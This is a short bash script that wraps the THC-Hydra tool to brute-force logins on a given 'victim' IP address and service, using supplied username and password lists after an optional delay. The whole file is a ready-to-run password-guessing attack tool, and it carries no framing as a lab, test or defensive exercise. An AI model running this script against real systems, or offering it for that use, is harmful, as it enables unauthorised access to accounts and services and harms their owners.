#!/bin/bash

#Bruteforce-attack using THC-Hydra

#Parameter
dstip=$1       #victim IP-address or name
service=$2     #service to be attacked
loginpath=$3   #path to login file
pwpath=$4      #path to password file
waiting=$5     #optional delay time

echo "Hydra initiated, starting in $waiting seconds"

sleep $waiting

echo "starting bruteforce-attack"
hydra -L $loginpath -P $pwpath $dstip $service;